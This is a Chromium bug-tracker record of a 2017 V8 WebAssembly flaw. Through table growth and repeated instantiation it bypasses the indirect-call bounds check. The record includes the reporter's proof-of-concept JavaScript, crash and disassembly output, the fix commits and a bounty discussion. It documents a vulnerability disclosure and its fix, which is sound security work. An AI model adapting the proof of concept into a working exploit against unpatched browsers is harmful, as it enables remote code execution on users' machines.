# [wasm] OOB access in v8 wasm after Symbol.toPrimitive overwrite

| Field | Value |
|-------|-------|
| **Issue ID** | [40088601](https://issues.chromium.org/issues/40088601) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>WebAssembly |
| **Platforms** | Windows |
| **Reporter** | cw...@gmail.com |
| **Assignee** | ti...@chromium.org |
| **Created** | 2017-08-04 |
| **Bounty** | $3,000.00 |

## Description

UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36

Steps to reproduce the problem:
PoC script for d8
```
load('test/mjsunit/wasm/wasm-constants.js');
load('test/mjsunit/wasm/wasm-module-builder.js');

var builder = new WasmModuleBuilder();
builder.addImportedTable("x", "table", 1, 10000000);
builder.addFunction("main", kSig_i_i)
  .addBody([
    kExprI32Const, 0,
    kExprGetLocal, 0,
    kExprCallIndirect, 0, kTableZero])
  .exportAs("main");
let module = new WebAssembly.Module(builder.toBuffer());
let table = new WebAssembly.Table({element: "anyfunc",
  initial: 1, maximum:1000000});
let instance = new WebAssembly.Instance(module, {x: {table:table}});

let myint = {};
myint[Symbol.toPrimitive] = function () {
  table.grow(99900); // <-- this expands function_table of instance
  return 1;          // <-- but, it shrinks table.
}
for (let i = 0; i < 4; i++)
  table.grow(myint);

let instance2 = new WebAssembly.Instance(module, {x: {table:table}});
table.grow(myint);

instance2.exports.main(0x313131/8); // <- table index
```
wasm-constants.js and wasm-module-builder.js are from the v8 repository

What is the expected behavior?
not crash

What went wrong?
---
(2068.1b58): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
000003ab`d807ed33 48833c0300      cmp     qword ptr [rbx+rax],0 ds:0000026e`2c295340=????????????????
0:000> r rax
rax=000000000031313f
0:000> u
000003ab`d807ed33 48833c0300      cmp     qword ptr [rbx+rax],0
000003ab`d807ed38 0f852c000000    jne     000003ab`d807ed6a
000003ab`d807ed3e 48bb012230fca7000000 mov rbx,0A7FC302201h
000003ab`d807ed48 488b1c03        mov     rbx,qword ptr [rbx+rax]
000003ab`d807ed4c 33c0            xor     eax,eax
000003ab`d807ed4e 4883c37f        add     rbx,7Fh
000003ab`d807ed52 ffd3            call    rbx
000003ab`d807ed54 488be5          mov     rsp,rbp
---

the table bound checking is bypassed, and the rax register (index) is controlled by a user input.

In wasm-js.cc, side-effects code can be triggered.
---
void WebAssemblyTableGrow(const v8::FunctionCallbackInfo<v8::Value>& args) {
..
  i::Handle<i::FixedArray> old_array(receiver->functions(), i_isolate);
  int old_size = old_array->length(); // <-- Caching old_array and length
  int64_t new_size64 = 0;
  if (args.Length() > 0 && !args[0]->IntegerValue(context).To(&new_size64)) { // <-- IntegerValue triggers side-effects code
    return;
  }
  new_size64 += old_size;

..

  int new_size = static_cast<int>(new_size64);
  receiver->grow(i_isolate, static_cast<uint32_t>(new_size - old_size)); // <---

  if (new_size != old_size) {
..
    receiver->set_functions(*new_array); // <--
  }

..
}
---

In wasm-objects.cc (grow), load the function table size, and call patch.
---
void WasmTableObject::grow(Isolate* isolate, uint32_t count) {
..
  uint32_t old_size = functions()->length(); // <-- load table size

..
    code_specialization.PatchTableSize(old_size, old_size + count); // <-- Patch existing wasm codes referring table size. then, I guess bound checking could be changed with a wrong table size.
..
    code_specialization.ApplyToWholeInstance(
        WasmInstanceObject::cast(dispatch_tables->get(i)));
..
  }
___

Did this work before? N/A 

Chrome version: 60.0.3112.90  Channel: stable
OS Version: 10.0
Flash Version:

## Attachments

- [poc.zip](attachments/poc.zip) (application/octet-stream, 7.1 KB)

## Timeline

### cl...@chromium.org (2017-08-04)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4962174052335616.

### el...@chromium.org (2017-08-04)

Crash repros in Canary 62.3174 as well.

crash/6077b71268000000

[Monorail components: Blink>JavaScript>WebAssembly]

### cw...@gmail.com (2017-08-07)

hmm.. it was not because of toPrimitive side-effects. the side-effects part is still problematic, but the PoC is not related with the side-effects. the following code is still crashing:
```
var builder = new WasmModuleBuilder();
builder.addImportedTable("x", "table", 1, 10000000);
builder.addFunction("main", kSig_i_i)
  .addBody([
    kExprI32Const, 0,
    kExprGetLocal, 0,
    kExprCallIndirect, 0, kTableZero])
  .exportAs("main");
let module = new WebAssembly.Module(builder.toBuffer());
let table = new WebAssembly.Table({element: "anyfunc",
  initial: 1, maximum:1000000});
let instance = new WebAssembly.Instance(module, {x: {table:table}});

//let myint = {};
//myint[Symbol.toPrimitive] = function () {
//  table.grow(99900);
//  return 1;
//}
for (let i = 0; i < 4; i++)
  //table.grow(myint);
  table.grow(99900);

let instance2 = new WebAssembly.Instance(module, {x: {table:table}});
//table.grow(myint);

instance2.exports.main(0x313131/8);
```

### cw...@gmail.com (2017-08-07)

[Comment Deleted]

### cw...@gmail.com (2017-08-07)

this is because of creating instance objects with the same module. even though an instance is created with the same module, it also changes boundary checks. Thus, duplicated patching table size causes OOB.

### ms...@chromium.org (2017-08-07)

[Empty comment from Monorail migration]

### ti...@chromium.org (2017-08-07)

Looks like the wrong table size is being patched in after the second instance is created:

0x286ccb405120     0  55             push rbp
0x286ccb405121     1  4889e5         REX.W movq rbp,rsp
0x286ccb405124     4  6a0c           push 0xc
0x286ccb405126     6  4883ec08       REX.W subq rsp,0x8
0x286ccb40512a     a  493ba5e80c0000 REX.W cmpq rsp,[r13+0xce8]
0x286ccb405131    11  0f8687000000   jna 0x286ccb4051be  <+0x9e>
0x286ccb405137    17  3de1310c00     cmp rax,0xc31e1         ;; wasm function table size reference (== 799201)
0x286ccb40513c    1c  0f83a3000000   jnc 0x286ccb4051e5  <+0xc5>
0x286ccb405142    22  8d1cc50f000000 leal rbx,[rax*8+0xf]
0x286ccb405149    29  49ba0000000001000000 REX.W movq r10,0x100000000
0x286ccb405153    33  4c3bd3         REX.W cmpq r10,rbx
0x286ccb405156    36  7310           jnc 0x286ccb405168  <+0x48>
0x286ccb405158    38  48ba0000000001000000 REX.W movq rdx,0x100000000
0x286ccb405162    42  e879f1d7ff     call 0x286ccb1842e0  (Abort)    ;; code: BUILTIN
0x286ccb405167    47  cc             int3l
0x286ccb405168    48  48ba0122f068f72f0000 REX.W movq rdx,0x2ff768f02201    ;; object: 0x2ff768f02201 <FixedArray[399601]>
0x286ccb405172    52  48833c1a00     REX.W cmpq [rdx+rbx*1],0x0
0x286ccb405177    57  0f8553000000   jnz 0x286ccb4051d0  <+0xb0>
0x286ccb40517d    5d  8d04c50f000000 leal rax,[rax*8+0xf]
0x286ccb405184    64  49ba0000000001000000 REX.W movq r10,0x100000000
0x286ccb40518e    6e  4c3bd0         REX.W cmpq r10,rax
0x286ccb405191    71  7310           jnc 0x286ccb4051a3  <+0x83>
0x286ccb405193    73  48ba0000000001000000 REX.W movq rdx,0x100000000
0x286ccb40519d    7d  e83ef1d7ff     call 0x286ccb1842e0  (Abort)    ;; code: BUILTIN
0x286ccb4051a2    82  cc             int3l
0x286ccb4051a3    83  48bb0122e0b74a320000 REX.W movq rbx,0x324ab7e02201    ;; object: 0x324ab7e02201 <FixedArray[399601]>
0x286ccb4051ad    8d  488b1c03       REX.W movq rbx,[rbx+rax*1]
0x286ccb4051b1    91  33c0           xorl rax,rax
0x286ccb4051b3    93  4883c35f       REX.W addq rbx,0x5f
0x286ccb4051b7    97  ffd3           call rbx
0x286ccb4051b9    99  488be5         REX.W movq rsp,rbp
0x286ccb4051bc    9c  5d             pop rbp
0x286ccb4051bd    9d  c3             retl
0x286ccb4051be    9e  488945f0       REX.W movq [rbp-0x10],rax
0x286ccb4051c2    a2  e8198ef1ff     call 0x286ccb31dfe0  (WasmStackGuard)    ;; code: BUILTIN
0x286ccb4051c7    a7  488b45f0       REX.W movq rax,[rbp-0x10]
0x286ccb4051cb    ab  e967ffffff     jmp 0x286ccb405137  <+0x17>
0x286ccb4051d0    b0  e8eb92f1ff     call 0x286ccb31e4c0  (ThrowWasmTrapFuncSigMismatch)    ;; code: BUILTIN
0x286ccb4051d5    b5  48ba0000000078000000 REX.W movq rdx,0x7800000000
0x286ccb4051df    bf  e8fcf0d7ff     call 0x286ccb1842e0  (Abort)    ;; code: BUILTIN
0x286ccb4051e4    c4  cc             int3l
0x286ccb4051e5    c5  e83692f1ff     call 0x286ccb31e420  (ThrowWasmTrapFuncInvalid)    ;; code: BUILTIN
0x286ccb4051ea    ca  48ba0000000078000000 REX.W movq rdx,0x7800000000
0x286ccb4051f4    d4  e8e7f0d7ff     call 0x286ccb1842e0  (Abort)    ;; code: BUILTIN
0x286ccb4051f9    d9  cc             int3l
0x286ccb4051fa    da  90             nop
0x286ccb4051fb    db  90             nop


% p ((FixedArray*)$rdx)->length()
$14 = 399601

Deepti, can you take a look?


### ti...@chromium.org (2017-08-08)

I have a fix for this issue, but uncovered several other bugs in the process.

The main culprit is that patching the table size refs in src/assembler.cc does a relative calculation, when it should just write the new size in without any smarts.

### ts...@chromium.org (2017-08-08)

[Empty comment from Monorail migration]

### br...@chromium.org (2017-08-08)

[Empty comment from Monorail migration]

### bu...@chromium.org (2017-08-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/f6d5504f9869cbdc83a144f13df5fc2e95a1556f

commit f6d5504f9869cbdc83a144f13df5fc2e95a1556f
Author: Ben L. Titzer <titzer@chromium.org>
Date: Wed Aug 09 14:44:33 2017

[wasm] Fix patching of table sizes.

BUG=chromium:752423
R=mtrofin@chromium.org,bradnelson@chromium.org

Change-Id: Ie6d80a82cd40b598e917a79842e6639e73be9194
Reviewed-on: https://chromium-review.googlesource.com/606587
Reviewed-by: Mircea Trofin <mtrofin@chromium.org>
Commit-Queue: Ben Titzer <titzer@chromium.org>
Cr-Commit-Position: refs/heads/master@{#47251}
[modify] https://crrev.com/f6d5504f9869cbdc83a144f13df5fc2e95a1556f/src/assembler.cc
[add] https://crrev.com/f6d5504f9869cbdc83a144f13df5fc2e95a1556f/test/mjsunit/regress/wasm/regress-752423.js


### bu...@chromium.org (2017-08-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/f0e07e4ba8d28e5d79f34b3ce47dcc10e87b39a4

commit f0e07e4ba8d28e5d79f34b3ce47dcc10e87b39a4
Author: Deepti Gandluri <gdeepti@chromium.org>
Date: Tue Aug 22 22:28:47 2017

[wasm] Remove redundant table size relocation

BUG=chromium:752423

Change-Id: Ifea2fba7e002cb88dd6e53170fe98d3fd4af686a
Reviewed-on: https://chromium-review.googlesource.com/609445
Commit-Queue: Deepti Gandluri <gdeepti@chromium.org>
Reviewed-by: Ben Titzer <titzer@chromium.org>
Cr-Commit-Position: refs/heads/master@{#47527}
[modify] https://crrev.com/f0e07e4ba8d28e5d79f34b3ce47dcc10e87b39a4/src/wasm/module-compiler.cc
[modify] https://crrev.com/f0e07e4ba8d28e5d79f34b3ce47dcc10e87b39a4/test/mjsunit/wasm/indirect-tables.js


### sh...@chromium.org (2017-08-23)

titzer: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2017-08-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/c65792128c4e361c3a8021423b6f894ab8a401e1

commit c65792128c4e361c3a8021423b6f894ab8a401e1
Author: Choongwoo Han <cwhan.tunz@gmail.com>
Date: Mon Aug 28 11:27:46 2017

[wasm] get length at the right time Table.p.grow

Get the old table size after converting integer of 'delta' argument.
Converting integer of the argument can execute another javascript code,
and the code can trigger mismatching between table sizes of instance and
table object, which causes redundant memory allocation.

http://webassembly.org/docs/js/#webassemblytableprototypegrow

Bug: chromium:752423
Change-Id: If9a576d20625d0c39342ea5de114e9fc9f230125
Reviewed-on: https://chromium-review.googlesource.com/627248
Reviewed-by: Ben Titzer <titzer@chromium.org>
Commit-Queue: Ben Titzer <titzer@chromium.org>
Cr-Commit-Position: refs/heads/master@{#47641}
[modify] https://crrev.com/c65792128c4e361c3a8021423b6f894ab8a401e1/src/wasm/wasm-js.cc
[modify] https://crrev.com/c65792128c4e361c3a8021423b6f894ab8a401e1/test/mjsunit/wasm/table.js


### ti...@chromium.org (2017-08-29)

Choongwoo, does the patch above fix this issue?

### cw...@gmail.com (2017-08-29)

Yes, I guess so. the critical issue (OOB) is fixed by  f6d5504f9869cbdc83a144f13df5fc2e95a1556f and f0e07e4ba8d28e5d79f34b3ce47dcc10e87b39a4. the minor issue (spec violation and memory leak) is fixed by c65792128c4e361c3a8021423b6f894ab8a401e1.

### ti...@chromium.org (2017-08-29)

Thanks!

### sh...@chromium.org (2017-08-29)

[Empty comment from Monorail migration]

### aw...@google.com (2017-09-05)

[Empty comment from Monorail migration]

### aw...@google.com (2017-09-06)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-09-11)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2017-09-11)

Congrats! The VRP panel decided to award $3,000 for this report!

### cw...@gmail.com (2017-09-11)

Thanks! btw, can I ask why is this reward 3,000? this is a RCE bug and register is controlled. though the current crash point is `cmp`, it will call `call reg` instruction when the function signature is matched, so it will change eip register. the register control is also not limited. 

### aw...@chromium.org (2017-09-12)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-09-15)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-09-15)

This bug requires manual review: M62 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: amineer@(Android), cmasso@(iOS), bhthompson@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2017-09-16)

Already in M62

### cw...@gmail.com (2017-09-19)

Please credit me as "Choongwoo Han of Naver Corporation".

### aw...@chromium.org (2017-09-20)

Requesting M61 merge of commit in https://crbug.com/chromium/752423#c11

### aw...@chromium.org (2017-09-20)

Though we wouldn't respin for this issue, it's an externally reported high severity bug that would be very useful for exploitation.  Commit in #11 has been in dev for a month and beta for a week and is a small, safe change it would be great to take opportunistically.

### go...@chromium.org (2017-09-20)

Approving merge to M61 branch 3163 based on https://crbug.com/chromium/752423#c30 and per offline chat  awhalley@.

+hablich@ as FYI

### bu...@chromium.org (2017-09-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/7b903102e648a80a467150d48d1dc408672b3558

commit 7b903102e648a80a467150d48d1dc408672b3558
Author: Ben L. Titzer <titzer@chromium.org>
Date: Wed Sep 20 21:32:43 2017

Merged:[wasm] Fix patching of table sizes.

BUG=chromium:752423
R=​mtrofin@chromium.org,bradnelson@chromium.org
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true

Change-Id: Ie6d80a82cd40b598e917a79842e6639e73be9194
Reviewed-on: https://chromium-review.googlesource.com/606587
Reviewed-by: Mircea Trofin <mtrofin@chromium.org>
Commit-Queue: Ben Titzer <titzer@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#47251}(cherry picked from commit f6d5504f9869cbdc83a144f13df5fc2e95a1556f)
Reviewed-on: https://chromium-review.googlesource.com/675672
Commit-Queue: Deepti Gandluri <gdeepti@chromium.org>
Cr-Commit-Position: refs/branch-heads/6.1@{#84}
Cr-Branched-From: 1bf2e10ddb194d4c2871a87a4732613419de892d-refs/heads/6.1.534@{#1}
Cr-Branched-From: e825c4318eb2065ffdf9044aa6a5278635c36427-refs/heads/master@{#46746}
[modify] https://crrev.com/7b903102e648a80a467150d48d1dc408672b3558/src/assembler.cc
[add] https://crrev.com/7b903102e648a80a467150d48d1dc408672b3558/test/mjsunit/regress/wasm/regress-752423.js


### aw...@google.com (2017-09-20)

[Empty comment from Monorail migration]

### as...@chromium.org (2017-09-21)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-10-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-12-05)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/752423?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40088601)*
